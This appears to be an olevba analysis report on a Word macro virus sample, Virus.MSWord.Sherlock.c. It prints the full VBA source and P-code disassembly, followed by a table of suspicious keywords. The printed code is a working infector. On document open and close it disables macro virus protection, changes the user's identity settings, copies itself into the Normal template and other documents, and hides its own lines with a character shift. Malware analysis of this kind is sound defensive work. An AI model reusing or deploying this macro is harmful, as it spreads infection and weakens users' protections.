olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sherlock.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sherlock.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const BOK = "Rio&Umi 4ever together"
'Read
Private Sub document_open()
  Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = AD.Find(BOK, 1, 1, 100, 100)
  NTi = NT.Find(BOK, 1, 1, 100, 100)
 
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Unread" Then
    Call dekrip
  ElseIf Thi.lines(2, 1) = "'Read" Then
    GoTo finish
  End If
Application.Caption = "Rio&Umi 4ever together"


finish:
End Sub


Private Sub document_close()
On Error GoTo finish
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Application.UserName = "Rio&Umi 4ever together"
  Application.UserAddress = "rio96@student.te.ugm.ac.id"
  Application.UserInitials = "Rio"
  Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = AD.Find(BOK, 1, 1, 100, 100)
  NTi = NT.Find(BOK, 1, 1, 100, 100)
  
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Read" Then
    Call enkrip
  ElseIf Thi.lines(2, 1) = "'Unread" Then
    GoTo finish
  End If
  
  If (ADi = True And NTi = False) Then
    SAVIT = NormalTemplate.Saved
    NT.deletelines 1, NT.Countoflines
    codde = Thi.lines(1, Thi.Countoflines)
    NT.addfromstring codde
    Rem If savit Then NormalTemplate.Save
  ElseIf (ADi = False And NTi = True) Then
    SAVIT = ActiveDocument.Saved
    AD.deletelines 1, AD.Countoflines
    codde = Thi.lines(1, Thi.Countoflines)
     AD.addfromstring codde
    If SAVIT Then ActiveDocument.Save
  End If
  
ActiveDocument.Save
finish:


ActiveDocument.Save

End Sub

Private Sub enkrip()
Dim test1 As String
   
    'JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = "'"
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 1 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) + 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = "'"
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Unread"
End Sub

Private Sub dekrip()
Dim test1 As String
    
    'JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = ""
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 2 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) - 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = ""
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Read"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Sherlock.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5798 bytes
' Line #0:
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	VarDefn BOK
' Line #2:
' 	QuoteRem 0x0000 0x0004 "Read"
' Line #3:
' 	FuncDefn (Private Sub document_open())
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #7:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld AD 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #8:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld NT 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #9:
' Line #10:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #11:
' 	GoTo finish 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	ArgsCall (Call) dekrip 0x0000 
' Line #15:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	ElseIfBlock 
' Line #16:
' 	GoTo finish 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	Ld Application 
' 	MemSt Caption 
' Line #19:
' Line #20:
' Line #21:
' 	Label finish 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub document_close())
' Line #26:
' 	OnError finish 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	Ld Application 
' 	MemSt UserName 
' Line #30:
' 	LitStr 0x001A "rio96@student.te.ugm.ac.id"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #31:
' 	LitStr 0x0003 "Rio"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #35:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld AD 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #36:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld NT 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #37:
' Line #38:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #39:
' 	GoTo finish 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	IfBlock 
' Line #42:
' 	ArgsCall (Call) enkrip 0x0000 
' Line #43:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	ElseIfBlock 
' Line #44:
' 	GoTo finish 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #48:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SAVIT 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd Countoflines 
' 	Ld NT 
' 	ArgsMemCall deletelines 0x0002 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	MemLd Countoflines 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	St codde 
' Line #51:
' 	Ld codde 
' 	Ld NT 
' 	ArgsMemCall addfromstring 0x0001 
' Line #52:
' 	Rem 0x0022 " If savit Then NormalTemplate.Save"
' Line #53:
' 	Ld ADi 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	ElseIfBlock 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SAVIT 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd Countoflines 
' 	Ld AD 
' 	ArgsMemCall deletelines 0x0002 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	MemLd Countoflines 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	St codde 
' Line #57:
' 	Ld codde 
' 	Ld AD 
' 	ArgsMemCall addfromstring 0x0001 
' Line #58:
' 	Ld SAVIT 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' 	Label finish 
' Line #63:
' Line #64:
' Line #65:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #66:
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Private Sub enkrip())
' Line #70:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #71:
' Line #72:
' 	QuoteRem 0x0004 0x0048 "JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #74:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #75:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #76:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #77:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld panbar 
' 	For 
' Line #78:
' 	Ld Like 
' 	Ld t 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #79:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #82:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #83:
' 	StartForVariable 
' 	Next 
' Line #84:
' 	LitDI2 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Private Sub dekrip())
' Line #88:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #89:
' Line #90:
' 	QuoteRem 0x0004 0x004A "JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #92:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #93:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #94:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #95:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld panbar 
' 	For 
' Line #96:
' 	Ld Like 
' 	Ld t 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #97:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #100:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #101:
' 	StartForVariable 
' 	Next 
' Line #102:
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "'Read"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #103:
' 	EndSub 
' Line #104:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

